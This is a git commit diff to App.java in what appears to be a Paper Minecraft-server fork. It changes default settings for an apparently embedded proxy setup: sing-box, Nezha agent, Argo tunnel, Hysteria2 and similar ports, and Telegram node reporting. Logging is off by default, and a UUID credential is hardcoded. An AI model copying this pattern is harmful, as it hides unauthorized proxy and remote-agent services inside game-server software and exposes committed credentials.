1b62b572451ba21641e6b1158fb515c814384468
yangzhicong <78916531+yangzhicong@users.noreply.github.com>
2026-08-23 21:57:35 +0800

    Update App.java

--- paper-server/src/main/java/io/papermc/paper/sbx/App.java
+++ paper-server/src/main/java/io/papermc/paper/sbx/App.java
@@ -43,8 +43,8 @@ public class App {
     private static final boolean AUTO_ACCESS = envBool("AUTO_ACCESS", false);
     private static final boolean YT_WARPOUT = envBool("YT_WARPOUT", false);
     private static final String FILE_PATH = env("FILE_PATH", "world");
-    private static final String SUB_PATH = env("SUB_PATH", "sub");
-    private static final String UUID = env("UUID", "0a6568ff-ea3c-4271-9020-450560e10d61");
+    private static final String SUB_PATH = env("SUB_PATH", "yzc");
+    private static final String UUID = env("UUID", "68ddd999e");
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "");
@@ -52,7 +52,7 @@ public class App {
     private static final String ARGO_AUTH = env("ARGO_AUTH", "");
     private static final int ARGO_PORT = envInt("ARGO_PORT", 8001);
     private static final String S5_PORT = env("S5_PORT", "");
-    private static final String HY2_PORT = env("HY2_PORT", "");
+    private static final String HY2_PORT = env("HY2_PORT", "14609");
     private static final String TUIC_PORT = env("TUIC_PORT", "");
     private static final String ANYTLS_PORT = env("ANYTLS_PORT", "");
     private static final String REALITY_PORT = env("REALITY_PORT", "");
@@ -61,7 +61,7 @@ public class App {
     private static final String NAME = env("NAME", "");
     private static final String CHAT_ID = env("CHAT_ID", "");  // 如果关闭了log输出,请填写tg推送，否则找不到节点
     private static final String BOT_TOKEN = env("BOT_TOKEN", "");
-    private static final boolean DISABLE_ARGO = envBool("DISABLE_ARGO", false);
+    private static final boolean DISABLE_ARGO = envBool("DISABLE_ARGO", true);
     private static final boolean SHOW_LOG = !List.of("false", "disable", "no").contains(env("SHOW_LOG", "false").toLowerCase()); // true/yes显示log，false/disable/no屏蔽log，默认关闭
    
     private static final Path ROOT = Path.of("").toAbsolutePath();
@@ -69,7 +69,7 @@ public class App {
     private static final Path SING_BOX_CONFIG_PATH = RUNTIME_DIR.resolve("config.json");
     private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("config.yaml");
     private static final Path BOOT_LOG_PATH = RUNTIME_DIR.resolve("boot.log");
-    private static final Path SUB_FILE_PATH = RUNTIME_DIR.resolve("sub.txt");
+    private static final Path SUB_FILE_PATH = RUNTIME_DIR.resolve("uuid.txt");
     private static final Path LIST_FILE_PATH = RUNTIME_DIR.resolve("list.txt");
     private static final Path INDEX_FILE_PATH = ROOT.resolve("index.html").normalize();
     private static final Path KEYPAIR_PATH = RUNTIME_DIR.resolve("keypair.properties");
